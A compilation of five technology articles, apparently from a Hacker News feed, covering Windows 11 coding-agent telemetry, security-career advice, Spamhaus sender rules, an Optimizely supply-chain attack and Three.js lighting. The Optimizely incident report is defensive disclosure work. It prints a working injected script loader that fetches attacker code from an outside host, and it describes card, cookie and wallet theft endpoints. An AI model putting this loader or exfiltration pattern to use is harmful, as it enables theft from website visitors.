item.title: Windows 11 Is Collecting Data on Which Coding Agents and Developer Tools You Use (696 pts)
item.description:
URL: https://xusheng.dev/posts/windows-coding-agent-telemetry/, See on Hacker News

Reverse engineering Windows 11's MissionControlAggregator reveals coding-agent and developer-tool usage bits in a diagnostic ETW report.

I recently asked AI to help me look through the latest Windows binaries for undocumented features and functionality. Among the leads it turned up, one list immediately caught my attention: coding agents such as codex.exe, claude.exe, copilot.exe, and cursor.exe, alongside familiar developer tools such as python.exe, dotnet.exe, gcc.exe, and code.exe.

Why would a Windows system DLL need a list of coding agents and developer tools?

The names were in MissionControlAggregator.dll. I asked the agent to follow the references and dig into what the DLL actually does. That led from a handful of string comparisons to a running Windows component that records which coding agents and developer tools have been used, saves that information locally, and reports it to Windows Diagnostics. And unless you have opted out of the “optional” diagnostic data (which is enabled by default), the data is uploaded to Microsoft.

I shared the initial finding on X. This post includes more details about the investigation behind it.

Following the names

Opening the DLL in Binary Ninja made the first lead easy to see. These were explicit executable names embedded in a Windows component:

Following the references showed that the names were used in comparisons. There are four CLI-agent slots checking copilot.exe, claude.exe, codex.exe, and agy.exe, with extensionless equivalents on the WSL route. Five desktop-agent slots check github.exe, claude.exe, codex.exe, cursor.exe, and antigravity.exe.

Here is one of the comparisons against codex.exe:

The compiler-generated C++ names are unwieldy, so I will call these functions executable-name matchers. For reference, one related matcher is std::_Func_impl_no_alloc<<lambda_340dfe7e962ab225b6ac33bc664bd54f>, bool, std::basic_string_view<wchar_t, std::char_traits<wchar_t>> const&, Microsoft::Diagnostics::MissionControlAggregator::Utils::AppType>::_Do_call. The screenshot shows another lambda instantiation performing the same kind of name comparison.

The feature guarding the new agent checks has a particularly direct name: CLICodingAgentUsage, feature ID 62580080.

And the list extends beyond AI agents. The same component checks for node.exe, python.exe, dotnet.exe, gcc.exe, clang.exe, gdb.exe, javac.exe, devenv.exe, and code.exe, among others. Those checks feed broader developer-tool categories. Some of these checks also verify the publisher: the Node.js slot expects Node.js Foundation, Python expects Python Software Foundation, and the .NET and Visual Studio slots expect Microsoft Corporation. The compiler/debugger group containing GCC and Clang has no additional publisher check in this path.

Where does the DLL get this information?

The next question was whether the component scans running processes itself. Following Aggregator::OnLoad revealed that it subscribes to existing Windows events instead.

For Windows programs, it consumes KernelProcess.AppStateChangeSummary and Win32kTraceLogging.AppInteractivitySummary. These provide application identities that its handlers parse and pass to the matchers. For WSL, it consumes Microsoft.Windows.Lxss.Manager.Exec and ExecCritical, using the imageName field. A regular Windows codex.exe can therefore reach the CLI-agent checks through the app-state summary route; this is not limited to Linux programs running inside WSL.

The relevant flow looks like this:

Aggregator::OnLoad
├─ WSL Exec / ExecCritical
│  └─ ProcessWslExecEvent → CLI agent matchers
├─ KernelProcess.AppStateChangeSummary
│  └─ ProcessAppStateChangeSummaryEvent → CLI agent matchers
└─ Win32kTraceLogging.AppInteractivitySummary
   └─ ProcessAppInteractivitySummaryEvent → desktop agent matchers

Aggregator::OnRelativeTimerExpire
└─ MissionControlAggregatorLogging::ReportCohorts<12,4,5>
   └─ Segments.SubCohorts ETW report

Aggregator::OnUnload / intermediate timer
└─ PersistentState::SaveToDisk

A successful match sets a slot in the aggregator’s state. Later, ReportCohorts<12,4,5> turns those slots into bitsets and emits a report named Segments.SubCohorts. The numbers correspond to twelve broader tool categories, four CLI agents, and five desktop agents.

ETW (Event Tracing for Windows) is the mechanism carrying that report. In this case, it is a self-describing TraceLogging event. Rather than writing the executable names into every report, the component assigns each category a bit. A set Codex bit means the matching tool was observed during the reporting window.

The source events also include runtime, time in focus, interaction counters, and resource usage. This component appears to discard those details and record only a bitmap of which agents were observed. The report’s timestamps describe the collection window, not how long each agent was used.

Although I found no prompt text or source code in this report, collecting which agents and developer tools someone uses already has significant privacy implications.

Is it actually running on a normal machine?

Strings and code are a useful lead, but I wanted to see the component running. I checked my Parallels Windows 11 ARM64 VM, build 26200.9974. Its MissionControlAggregator.dll was version 10.0.26100.9818, and CLICodingAgentUsage was already enabled as a service experiment. I had not manually enabled the feature.

DiagTrack, the Connected User Experiences and Telemetry service, was also already running with its startup type set to Automatic. It starts a separate AggregatorHost.exe process, and that process loads the DLL. The following administrative PowerShell commands show the service, its child process, and the loaded module:

PS> Get-Service DiagTrack | Format-Table Name,Status,StartType -AutoSize

Name       Status StartType
----       ------ ---------
DiagTrack Running Automatic

PS> Get-Process AggregatorHost | Format-Table ProcessName,Id -AutoSize

ProcessName      Id
-----------      --
AggregatorHost 1500

PS> Get-CimInstance Win32_Service -Filter "Name='DiagTrack'" |
       Format-List Name,State,StartMode,ProcessId

Name      : DiagTrack
State     : Running
StartMode : Auto
ProcessId : 10148

PS> Get-CimInstance Win32_Process -Filter "Name='AggregatorHost.exe'" |
       Format-List ProcessId,ParentProcessId

ProcessId       : 1500
ParentProcessId : 10148

PS> tasklist /m MissionControlAggregator.dll

Image Name                     PID Modules
========================= ======== ============================================
AggregatorHost.exe            1500 MissionControlAggregator.dll

The process IDs connect the pieces: DiagTrack runs in process 10148, which is the parent of AggregatorHost.exe, process 1500; the module listing places MissionControlAggregator.dll inside that child.

The public ISO’s baseline VM had the coding-agent feature disabled by image default, so the evidence does not support saying that it is active on every Windows installation. On my ARM64 VM, however, the relevant feature and service were active before the test.

Testing it in practice

To test the finding in practice, I copied cmd.exe to a file named codex.exe and ran it in the interactive Windows session. The name alone was enough for the component to recognize it as Codex.

I captured an AppStateChangeSummary for the running process from the KernelProcess provider ({2839ff94-8f12-4e1b-82e3-af7af77a450f}), with LaunchCount=1 and TerminateCount=0. The aggregator’s saved state contained the value 2 in CLI slot 2, the Codex slot. A separate run without an additional ETW trace also set that slot, confirming that detection worked through Windows’ existing diagnostic collection.

That state is persisted in:

C:\ProgramData\Microsoft\Diagnosis\AggregatorStorage\MissionControlAggregator$

The report normally follows a roughly daily boundary. To capture it immediately, I temporarily moved the saved reporting-window start 25 hours into the past and restarted DiagTrack with a trace listening for the aggregator. The resulting Segments.SubCohorts event contained:

Provider: Microsoft.Windows.MissionControlAggregator
Time:     2026-11-16T12:34:29.125116Z
Version:  0.1.5

CliAgentSubCohorts:     4
DesktopAgentSubCohorts: 0
FlushedFromSave:       true

The value 4 is 1 << 2: the Codex CLI bit. The name had made it through the input summary, the matcher, the persisted state, and the emitted report.

I also tested the developer-tool path separately, using a copy of cmd.exe named gcc.exe. It set developer-tool slot 3. With optional diagnostic data allowed, I found the resulting Segments.SubCohorts event in DiagTrack’s upload queue with SubCohorts: [8] (1 << 3). This is the compiler/debugger category shared by GCC, Clang, and related tools, rather than a separate bit for each executable.

Following the report toward Microsoft

An ETW event by itself would not establish that anything leaves the machine. ETW is used for plenty of local diagnostics. The more revealing question was who was listening to this particular report.

The VM already had a Diagtrack-Listener session subscribed to both ends of the path. These PowerShell queries showed its subscriptions:

Get-EtwTraceProvider -SessionName Diagtrack-Listener `
  -Guid '{2839ff94-8f12-4e1b-82e3-af7af77a450f}'

Get-EtwTraceProvider -SessionName Diagtrack-Listener `
  -Guid '{00de11a2-ec06-58e5-1a2b-21bb21dbee4b}'

The first subscription, for KernelProcess, had MatchAnyKeyword=0x400000000002, which includes the summary’s 0x400000000000 keyword. The second, for Microsoft.Windows.MissionControlAggregator, had MatchAnyKeyword=0xe00000000000, which includes the report’s 0x800000000000 keyword. Both had level 255.

The subscription showed where the report could go. To check whether Windows actually queued it for transmission, I inspected DiagTrack’s EventStore.db and decompressed the JSON batches in its AsimovEvents table. This revealed an important condition: the agent-usage report is treated as optional diagnostic data.

When optional diagnostic data is allowed (enabled by default in the US setup I tested), Windows queues the coding-agent usage report for upload to Microsoft. I verified this by finding the agent event itself in DiagTrack’s upload queue:

{
  "name": "Microsoft.Windows.MissionControlAggregator.Segments.SubCohorts",
  "ext": {
    "privacy": { "isRequired": false }
  },
  "data": {
    "Version": "0.1.5",
    "CliAgentSubCohorts": [4],
    "DesktopAgentSubCohorts": [0],
    "FlushedFromSave": true
  }
}

I checked this with a clean installation of Windows 11 Home ARM64 using the latest official ISO, with the region set to the United States. Before changing any privacy settings, the Diagnostic data toggle was already enabled and labeled Include Optional. After completing setup with those defaults, AllowTelemetry was 3, confirming that optional diagnostic data was enabled.

Optional diagnostic data is therefore enabled by default, at least in the US setup I tested. If you did not opt out of it during installation or disable optional diagnostic data later, it is still enabled and your coding agent usage data is being uploaded. You can decline optional diagnostics during setup or turn off Send optional diagnostic data later under Settings → Privacy & security → Diagnostics & feedback. Microsoft’s diagnostics and privacy guide explains how to change it.

item.title: How to Break into Security, Ptacek Edition (2012) (119 pts)
item.description:
URL: https://krebsonsecurity.com/2012/06/how-to-break-into-security-ptacek-edition/, See on Hacker News

At least once a month, sometimes more, readers write in to ask how they can break into the field of computer security. Some of the emails are from people in jobs that have nothing to do with security, but who are fascinated enough by the field to contemplate a career change. Others are already in an information technology position but are itching to segue into security. I always respond with my own set of stock answers, but each time I do this, I can’t help but feel my advice is incomplete, or at least not terribly well-rounded.

I decided to ask some of the brightest minds in the security industry today what advice they’d give. Almost everyone I asked said they, too, frequently get asked the very same question, but each had surprisingly different takes on the subject. Today is the first installment in a series of responses to this question. When the last of the advice columns have run, I’ll create an archive of them all that will be anchored somewhere prominently on the home page. That way, the next time someone asks how they can break into security, I’ll have more to offer than just my admittedly narrow perspectives on the matter.

Last month, I interviewed Thomas Ptacek, founder of Matasano Security, about how companies could beef up password security in the wake of a week full of news about password leaks at LinkedIn and other online businesses. Ptacek’s provocative advice generated such a huge amount of reader interest and further discussion that I thought it made sense to begin this series with his thoughts:

Ptacek: “Information security is one of the most interesting, challenging, and, if you do it carefully, rewarding fields in the technology industry. It’s one of the few technology jobs where the most fun roles are well compensated. If you grew up dreaming of developing games, the laws of supply and demand teach a harsh lesson early in your career: game development jobs are often tedious and usually pay badly. But if you watched “Sneakers” and ideated a life spent breaking or defending software, great news: infosec can be more fun in real life, and it’s fairly lucrative.

I’m a software developer. I try to look at security through the lens of computer science. To me, the most attractive thing about the field is the opportunity it provides to work with lots of different concepts at lots of different levels. Computer security might be the best way to work professionally with compiler theory, or to spend time understanding computer microarchitecture, or to apply advanced mathematics.

Other people get involved in security for different reasons, and those reasons are probably equally valid. Some people really like the “good guys / bad guys” narrative that comes with security. Some people see security as an opportunity to save the world. Other people are drawn to the competitive nature of the field: at the higher levels, it really is a cat-and-mouse game. It also comes closer to meritocracy than most of technology: you can either break in or you can’t; your defenses either work or they don’t.

But for me, it’s just one of the best development jobs you can get, and with that in mind, here’s my advice for people interested in pursuing a career in it.

First: I want you to learn how to program. Clearly, you can get through college and get a good-paying steady job without ever learning to love programming. But no one factor gives you as much control over your career, as much of an ability to write your own ticket, as the ability to solve problems using programming languages. A lot of very smart technology professionals have concluded that they just don’t enjoy writing software. Those people should reconsider. Try different languages, or different application domains, but find a way to make programming stick in your head.

Second: the best jobs in our field are in application security. You can get good steady work designing firewall deployments, setting up desktop agents, or responding to incidents. But all those roles are fundamentally reacting to what’s happening in appsec. The next generation of security products — along with the org charts of security teams at the savviest companies — are being designed now, by accident, by application security practitioners.

Appsec roles are roles that involve attacking software or devising fixes and countermeasures for those attacks. Two good ways to “come up” in appsec: become a penetration tester, or contribute to (or start) a secure software development practice in your company.

A good way to move into penetration testing: grab some industry standard tools and use an Amazon EC2 account to set up a “shooting range” to attack. Some of the best-known tools are available for free: the Nessus scanner, for instance, while not an application security tool, is free and can land you a network penetration testing role that you can use as a springboard to breaking applications.

When people reach out to Matasano asking how to get a foot in the door attacking software, we have a few simple steps to offer:

0. Learn to love programming in at least one language. The C Programming Language has the most cachet in application security, but for this step-by-step list, Java or Python or Ruby will do fine.

1. Grab a copy of  The Web Application Hacker’s Handbook.

2. Go to the “previous releases” archive at WordPress.org and grab very old versions of WordPress; install them at EC2.

3. Download OWASP WebScarab or Burp Suite Free Edition, both of which are free, and use them to find bugs in ancient WordPress.

If you’re already in an IT role, and want to come up on the defensive side of appsec, try to position yourself near custom software development. Most large firms build “line of business” applications. As a rule, building “line of business” isn’t particularly fun. But defending those apps can be; sometimes, the most boring applications turn out to be surprisingly sensitive.

And the good news for doing appsec in BigCo’s: most companies have very immature security programs. If you can get a role in QA, or in what the cool kids are calling “DevOps”, you can end up with a lot of influence in security. At Matasano, we’ve watched lots of ops people successfully transition to appsec and senior security management just by instituting basic security testing processes on their company’s software.

To me, the whole field boils down to studying, understanding, and manipulating technology. Like most software security practices, we’ve gotten our hands dirty with a fascinating cross-section of the whole technology industry. We’ve written attack tools that target the control registers of device chipsets, we’ve done custom RF work, we’ve written low-level debuggers for different CPU architectures, and we’ve seen and beaten up on products built in almost every programming language and every platform you can imagine. If crawling through the ventilation ducts of the world’s most important technology is something you think might make you tick like we do… well, appsec! Learn to code. Spend a couple days Starbucks money on an EC2 account and deploy some broken apps to break. Find opportunities to practice in your job.

And, uh, come talk to us? People like you are hard to find!”

item.title: Spamhaus new email sender requirements in November (134 pts)
item.description:
URL: https://www.spamhaus.org/sender-guidelines/, See on Hacker News

Note

Starting in November 2026, we are gradually rolling out a requirement for every sending IP to have a valid HELO, a reverse DNS (PTR) record, and a matching A record. Use the HELO checker below to see whether the DNS meets our best practices, and follow the guidelines to avoid being listed.

Guidance for senders, mail admins, and postmasters on meeting Spamhaus's sending requirements. All senders must meet these minimum email sending requirements to avoid being listed.

  1. Use confirmed opt-in (COI) for all subscribers

    Each recipient should confirm their address by clicking a link in a confirmation email. If no confirmation is received, do not send email to that address. Purchased, rented and harvested lists are the most common source of spam trap hits, and hitting traps is one of the fastest routes to a listing. See section

  2. Publish forward-confirmed reverse DNS for every sending IP

    Every sending IP must have a reverse DNS entry pointing to a fully qualified domain name (FQDN). That hostname must, in turn, resolve back to the same sending IP address. This is known as forward-confirmed reverse DNS (FCrDNS). An IP with missing or mismatched reverse DNS is treated as suspicious and is one of the most common reasons for an IP to be considered for listing. See section

  3. Use a HELO/EHLO hostname that resolves to the sending IP

    The hostname the server announces in the HELO/EHLO command must resolve to the IP it is connecting from, and must stay consistent across connections from that IP. Placeholder values, hosting-provider defaults, and hostnames that vary between connections are treated as signals of misconfiguration or compromise and can result in a listing. See section

  4. Meet the IPv6 allocation and reverse DNS minimum

    If sending over IPv6, the sending address must fall within an allocation of /64 or larger (a /64 is the standard block size we recommend assigning), and that space must have valid reverse DNS. IPv6 ranges without reverse DNS or with allocations smaller than /64 are often misused by spammers. See section

  5. Authenticate mail with SPF, DKIM and DMARC

    Publish SPF and DMARC records for every sending domain, sign every outbound message with a signature, and align the DKIM sending domain with the domain in the message's RFC 5322 From address. Authentication is one of the signals that shapes reputation, so gaps here make a listing more likely when other signals are weak. See section

Operating an Email Server Provider (ESP) or other shared sending infrastructure? See the ESPs and Large Senders guidelines

Check your HELO and DNS setup

Enter your sending IP to check its HELO and DNS setup against our guidelines. Results may not be available for all IPs and some queries might not provide results for internal policy reasons. You can also check the current HELO by sending an email to helocheck@abuseat.org.

1. Infrastructure and DNS

All sending infrastructure must have the following DNS and mailserver configuration. Failure to do so can result in IPs being listed on the Email Spam IPs (CSS) or compromised IPs (XBL) zones.

How to check

Run dig TXT <envelope sender domain> and confirm an SPF record is returned and includes the sending IPs.

2. Authentication

Authentication is how receiving mail servers verify that emails are authorized to send from the domain. Without SPF, DKIM, and DMARC properly configured, the domain is exposed to spoofing and phishing, and emails are more likely to be rejected or flagged by Spamhaus.

How to check

Run dig TXT <selector>._domainkey.<domain> (the selector is set in the ESP's DKIM setup page) and confirm a DKIM key, starting v=DKIM1, is returned.

3. Permission and List Hygiene

Send email only to people who want to receive it. Once the technical infrastructure is in place, the next step is building a legitimate list of email addresses from people who have provided explicit permission to receive the email. Lack of permission is one of the most common reasons for being listed by Spamhaus.

4. Sending best practices

How email is sent matters as much as what is sent. Warming the IP and domain, maintaining a consistent volume, using trusted links and domains within emails, and providing clear, legitimate ways to opt-out of emails will help improve overall deliverability.

5. IP and Domain Reputation

The reputation of the IP and domain as seen by Spamhaus can be checked via our reputation checker.

Spamhaus looks at multiple signals before assigning a reputation score, and a strong negative signal can outweigh the absence of positive ones — so following all email best practices consistently is essential.

Factors that influence reputation include: the service provider, the IP neighbourhood, the infrastructure the IPs are associated with, the upstream networks that connect to internet backbones, and the IP or domain's history — when it was first seen, when it was last used, and how it was used.

How to check

Run the domain through the Reputation Checker to get more insights.

Note: We do not accept requests for explanations of the attributes shown here or requests to reset reputation.

6. ESPs & Large Senders

ESPs and shared infrastructure hosts are responsible for the email sent via their infrastructure. Hosting abusive senders will negatively impact the reputation of shared domains and infrastructure.

Read the ESP & Large Sender guidelines

item.title: World's Largest Brands Infected With Malware Via Optimizely (189 pts)
item.description:
URL: https://blog.report-uri.com/worlds-largest-brands-infected-with-malware-via-optimizely/, See on Hacker News

  • Magecart
  • DarkSword
  • Coruna
  • Malware
  • CSP Integrity
  • JS Time Machine
  • JavaScript Integrity Monitoring
  • Script Vault
  • Script Watch

16 Nov 2026 — 14 min read

On 16 November 2026, malicious JavaScript was served to visitors of 178 organisations through the Optimizely Web experimentation platform. The list includes some of the most visited sites in the world: Zoom, the BBC, CNN, Salesforce, GitLab, IKEA, HSBC, Equifax, Air France-KLM, Ledger and Peacock.

The malware was a multi-purpose kit. It swapped cryptocurrency wallet addresses for the attacker's, skimmed payment cards, stole cookies and screenshots, and on iPhones and iPads it delivered the Coruna and DarkSword iOS exploit kits. Crypto has already been stolen, with verified transactions to the attackers.

This is exactly the kind of attack Report URI is designed to detect. Our platform can identify unexpected changes to trusted JavaScript, detect new scripts being loaded and reveal suspicious connections to external destinations. In this case, those signals would have exposed the malicious activity, even though the original script was being served from a trusted Optimizely domain. With an appropriate CSP in enforcement mode, organisations could have gone a step further and blocked key parts of the attack before they succeeded.

The important lesson here is that trusted JavaScript doesn't always remain trustworthy. A website can be compromised through a third-party dependency without its own code or infrastructure ever being breached.

Most of the malicious code has now been removed. At 21:52 UTC we found it in only 1 of the 188 infected snippets, down from 169 at 20:56 UTC. If your site uses Optimizely Web, or you visited any of the sites below today, read on.

What happened

Optimizely Web works by having each customer load a JavaScript "snippet" from Optimizely's CDN, for example https://cdn.optimizely.com/js/6395285578973184.js. The snippet contains Optimizely's code, the customer's experiments and an optional field called Project JavaScript (projectJS): custom code the customer writes in their Optimizely dashboard, which runs on every page.

The attacker wrote their own code into the Project JavaScript of customer projects, and the rest of each snippet was untouched. The file was still served from cdn.optimizely.com, with Optimizely's certificate, from a host that every affected site already trusted. Here is what was added to Zoom's snippet:

"projectJS": function(){(function(){try{var s=document.createElement('script');s.src='https://1688360.cc/track.js';s.async=true;(document.head||document.documentElement).appendChild(s);}catch(e){}})();

We saw three versions of the injected loader:

  1. A plain <script> tag pointing at https://1688360.cc/track.js (most snippets).
  2. The same URL hidden in base64 with atob(). A search for "1688360.cc" won't find it. Smartsheet's snippet was cleaned at one point and then re-infected with this version, so whoever wrote the code still had access at the time.
  3. A full inline copy of the payload, which runs through eval if 1688360.cc is blocked.

Some customers serve their snippet from their own domain, such as opt.scheels.com/js/<id>.js or www.vodafone.com.au/js/<id>.js. Those were affected too, because the content comes from the same Optimizely project.

We don't know how the attacker got write access to so many unrelated customer projects: a compromised Optimizely system, a compromised credential with cross-customer access, or something else. That's for Optimizely to explain. To be clear, Optimizely's CDN served exactly what it was given; this was not a CDN cache-poisoning attack. Optimizely's own sites were affected as well: the snippets for www.optimizely.com and login.optimizely.com both carried the code.

Timeline (UTC)

Time Event
Sep 17 webshell.lol, the same actor's injector, first appears on Turkish sites through an SEO "backlink panel" script
Nov 09 17:52 5vobauua3ojpklx.icu registered (iOS exploit-kit router)
Nov 13 to 11-16 Earlier wave: webshell.lol/get.js injected through Kissmetrics, StorifyMe and Minute Media scripts on sites including securitybank.com, faz.net, smh.com.au, vidaxl and foxsports.com
Nov 16 02:21 Last clean urlscan capture of the BBC's Optimizely snippet
Nov 16 04:21 First Optimizely injection seen (BBC snippet loading webshell.lol)
04:28 to 05:23 1688360.cc certificates issued; domain registered at 05:23
08:10 First build of track.js (crypto clipper)
08:28 1688360.cc/track.js first seen on bbc.com
11:20 Zoom's snippet modified (its Last-Modified header)
13:03 Attacker sweeps stolen crypto to exchanges
13:43 Card skimmer added to track.js
16:38 eil786npto9u5bq.icu registered (second iOS router)
17:13 to 17:57 Second iOS host added; Coruna iframe injected into every iOS 18.6-or-earlier visit
19:24 to 19:59 Our sweep: 186 of 1,611 Optimizely snippets infected
~20:40 to 21:10 Mass clean-up (Ledger 20:41, Smartsheet 20:56, BBC 21:07)
21:52 1 of 188 snippets still infected (TalkTalk)

The payload was rebuilt 26 times during the day. The attacker added features, and added wallets but never removed any.

What the payload does

Every visitor received the same script, track.js, and every part of it was active at once. What a visitor experienced depended on their device and what they did on the page.

1. Crypto address swapping (already stealing money)

The script finds any valid wallet address (BTC, ETH and EVM chains, TRON, Solana, TON, Litecoin, Bitcoin Cash, Dogecoin) and replaces it with one of the attacker's. It validates checksums so it only swaps real addresses. It swaps them in:

  • page text, form fields, links and images;
  • the clipboard, on copy and through navigator.clipboard;
  • outgoing fetch/XHR requests, window.open, navigation and the iOS share sheet.

It re-scans the page whenever it changes. Copy an address from any affected page, or from anywhere else while that tab is open, and you may paste the attacker's.

2. Card skimming

Added at 13:43 UTC. The script watches form submissions and every fetch/XHR POST for a card number (Luhn-checked), expiry date and CVV. When it has all three, it sends them to https://1688360.cc/card.php with navigator.sendBeacon. Cards entered in hosted payment iframes (Stripe, Adyen and similar) were out of its reach. Cards typed into a site's own form fields were not.

3. Cookie and screenshot theft

When it swaps an address next to wallet or payment wording, it sends the following to https://1688360.cc/hit.php:

  • the page URL;
  • document.cookie (cookies not marked HttpOnly);
  • the original addresses it replaced;
  • a screenshot of the page, rendered with html2canvas.

4. iOS exploit kits: Coruna and DarkSword

On iPhones and iPads the script loads boot.js from 5vobauua3ojpklx.icu and eil786npto9u5bq.icu. It reads the iOS version and loads an exploit chain in a hidden iframe:

iOS version Chain
13 to 17 Coruna (/A8/, plus a direct Coruna loader at /JIUJIU888/index.js)
18.x DarkSword (/B9/, /D11/, /D12/)
26 Separate chain (/C10/); currently only fingerprints the device

The Coruna loader is byte-identical to a sample we analysed in October from a different campaign. The kit's own comments say iOS 18.7.3 and later, and 26.3 and later, are patched. Pages on iOS 18.6 or earlier reload every 60 seconds to retry the exploit, which is a visible symptom.

Money stolen so far

As of 19:25 UTC on 16 November, the attacker's wallets had received about $7,040, all within roughly nine hours on the 16th:

Wallet Received ≈ USD
BTC 19g9rZcPeiz8rUvyWpTRyXXhPnjsWrc3kW 0.08298 BTC (4 tx), unspent $5,380
LTC ltc1q3wp7g6ds0ggg6fl6kncpa4sepn0q3qfacgred5 17.02 LTC (3 tx) $762
TRON THvs6p56XkUiMkJeSc51cAP64u2RsTYqxa 662.9 USDT + 184 TRX $719
ETH 0xC4026b06D82b0F0B363eda0642D61CfbDc17884e 0.055 ETH $100
BSC (same 0x address) 82 USDT $82

Funds were swept out at 13:03 to 13:05 UTC. The USDC on Ethereum went to a HitBTC deposit address. The TRON wallet has been in use since March 2026, so this actor was active long before this campaign. We cannot see how many cards or cookies reached 1688360.cc.

Who was affected

We fetched 1,611 distinct Optimizely snippets, found mostly through our own crawl data, and checked each one for the malicious code. 188 snippets belonging to 178 organisations were infected. We kept a copy of every infected file, along with its response headers, SHA-256 hash and fetch time as evidence. The real number is likely higher as we could only check snippets we could find in time.

By sector

Sector Orgs Examples
Banking & Finance 32 Paychex, HSBC US, Equifax, SmartAsset, HSBC Hong Kong
Technology & SaaS 23 Zoom, Bitly, Salesforce, GitLab, Optimizely
Retail & Fashion 20 IKEA, ASOS, Mattel, American Eagle, Scheels
Streaming & Entertainment 12 Peacock, D&D Beyond, Wizards of the Coast, NOW TV, Zattoo
News & Media 10 CNN, BBC, Fox News, NPR, CTV News
Airlines & Travel 9 Alaska Airlines / Hawaiian Airlines, Transavia, Air France-KLM, KLM Netherlands, Trafalgar
Healthcare & Pharma 8 Invisalign, Takeda, Covetrus, iTero (Align), Covetrus Pharmacy
Industrial & Manufacturing 8 Fluke, eMaint (Fluke), Fluke Networks, Vaillant Germany, Fluke Process Instruments
Telecoms 7 Virgin Media, Virgin Media O2, Vodafone Australia, O2, TPG Telecom
Crypto & Trading 6 Ledger, IG, OANDA / Coinpass, interactive investor, TMS Brokers

This is why monitoring what runs in your visitors' browsers is so important.   3. Send stolen data to 1688360.cc (connect-src).

item.title: My Quest to push native Three.js quality match AAA Game Engines (153 pts)
item.description:
URL: https://ben3d.ca/blog/building-the-aaa-lighting-pipeline-in-threejs, See on Hacker News

Part 2 picked a pipeline for indoor scenes: lightmaps, light probes and reflection probes, with SSR, SSGI and ambient occlusion on top. Here I measure Three.js against it one stage at a time: what the games require, what Three.js has, and what is missing.

The pipeline#

The pipeline has two parts. The setup fills three caches: lightmaps for static meshes, a light probe grid for moving objects, and reflection probes for each room.

Each frame then reads those caches and adds the screen-space work on top:

Where things stand#

StageIn Three.jsIn review or draftedStill to build
G-bufferMRT prepassOctahedral normals
Baked GIlightMap, unwrapper, baker, ray radiosity, denoiser, HDR JPEG XLSeam stitching, KHR_lightmap (draft)glTF JPEG XL and UltraHDR extensions, runtime BC6H
Dynamic GILightProbeGrid, 8× faster bakes, multi-bounce, updates spread across framesDDGI visibility (draft)—
OcclusionGTAO, builtinAOContext, AO from SSGINodeBent normals and GTSO (draft), joint bilateral upsample (draft)Bent normals from SSGINode
SSRStochastic GGX SSR, temporal accumulation, multi-bouncePrevious-frame tracing, Hi-Z tracing (draft), radiance and coverage output (draft), coverage in the denoiser (draft)Ray reuse, two-lookup history, skipping mirrors and matte pixels
SSGISSGINode, bounce light and AO from one horizon search, composited over the finished imagePrevious-frame tracing (draft)Coverage output, a diffuse source for the BRDF
Reflection probesSingle box-projected env map, PMREMProbe system (draft), cube arraysProbe normalization, 128² prefiltering
BRDF integrationAO context, environment fallback—Pluggable indirect specular and diffuse, coverage cascade
TRAA and TAAUTRAA node, TAAU nodeCatmull-Rom history (draft), wider clip at rest and test harness (draft)TAAU in the full pipeline, texture mip bias, the TRAA refinements ported to TAAU

The biggest remaining gaps are in the SSR, SSGI and BRDF rows: Hi-Z tracing and coverage for SSR, the same coverage for SSGI, and above all the pluggable indirect lighting that ties both cascades into the BRDF.

It has moved this fast because of the Three.js maintainers. Michael Herzog (@Mugen87) has reviewed most of these PRs, and more than once has reworked one into a better design that fits how Three.js as a whole is built, adjusting the renderer's internals to make room for it. mrdoob has expressed strong support for many of them. I am very lucky to have both.

So far, though, these pieces have been proposed and reviewed one at a time. Nobody has been asked to sign up to the whole. This series is my attempt to put them together into one picture, so that each PR can be judged for where it fits as well as for what it does.

The pipeline, stage by stage#

The G-buffer#

What the games require. SSR, GTAO and the denoisers run in screen space before lighting, so they need per-pixel depth, normals, roughness, metalness and motion vectors. A deferred engine also stores base color and emissive, because its lighting pass reads only the G-buffer. Three.js renders forward and its beauty pass reads those from the material, so the G-buffer fits in 16 bytes per pixel. Part 2 has the layout and the memory budget for the whole frame.

What Three.js has. WebGPURenderer already renders a G-buffer prepass with multiple render targets, and the SSR examples use it today:

const scenePass = pass( scene, camera );
scenePass.setMRT( mrt( {
	output: output,
	diffuseColor: vec4( diffuseColor.rgb, materialMetalness ),
	normal: vec4( packNormalToRGB( normalView ).rgb, materialRoughness ),
	velocity: velocity
} ) );

What is missing. Normal precision. SSR is unforgiving of normal error: a ray reflected off a slightly wrong normal lands somewhere visibly wrong at the end of a long trace. With RGB8 normals, smooth curved surfaces snap to a limited set of directions, and their reflections show banding and clumping.

AAA G-buffers use octahedral encoding: fold the sphere of directions onto an octahedron, unfold it into a square, and store two coordinates. It is the most accurate of the encodings surveyed by Cigolle et al. for its size. PR #35480 adds packNormalToOctahedral() and unpackOctahedralToNormal():

Encoding (4 bytes / pixel)Mean errorMax errorAvailability
RGB8 (today)0.17°0.38°Everywhere
Octahedral RG16F0.011°0.040°Everywhere in WebGPU
Octahedral RG16 snorm0.0013°0.0037°93% of WebGPU devices

RG16 snorm is the target, with RG16F as the fallback.

Global illumination#

What the games require. Bounce light baked into lightmaps for everything that does not move, and a probe volume to light dynamic objects, ideally one that does not leak light through walls.

What Three.js has. Every standard material takes a lightMap, and there is now a complete baking pipeline in the browser to make one; that is Part 4. For dynamic objects, LightProbeGrid places a grid of probes through a scene, each storing incoming light as L2 spherical harmonics, and lights each object from the probes around it (example).

The grid's limit was how long a capture took. Profiling showed the bake was CPU-bound on submitting render passes, so the batched capture renders eight probes per pass with one array camera, and a resolution-12 grid dropped from 5.6 s to 1.2 s. Culling each draw against its own sub-camera doubled that again. The grid now bakes about eight times faster than it did at the start of September, fast enough to re-capture a few probes per frame, and supports multi-bounce light. Integrating the spherical harmonics exactly also cut their error from 2.4% to 0.08%.

What is missing. Probes leak. A probe on one side of a wall can light an object on the other, so a dark room glows with the light of the bright room next door. DDGI solves this by storing, with each probe, the distance to the nearest surface in every direction, and ignoring probes that cannot see the point being lit. I have DDGI-style visibility weighting working as a draft PR. Testing visibility against all eight surrounding probes was costly, so the draft can use tetrahedral interpolation, which blends four:

On SponzaAdded render time
Eight probes, trilinear30%
Four probes, tetrahedral10%

Ambient and specular occlusion#

What the games require. Lightmaps are too coarse for contact shadows, and they know nothing about dynamic objects. Games add screen-space occlusion on top, and Activision's GTAO is the standard. It also produces a bent normal, the average open direction, which gives specular occlusion (GTSO): a reflection pointing into a fold of the surface is occluded, one pointing out of the opening is not.

Horizon-based SSGI, which is what Three.js has, runs the same depth-buffer search as GTAO and gathers light along the way. With SSGI on, its pass supplies the occlusion and the bent normal, and GTAO runs only when SSGI is off.

Which light the occlusion applies to matters as much as how it is computed. Occlusion is a shared buffer, set with builtinAOContext, and each source decides whether to read it:

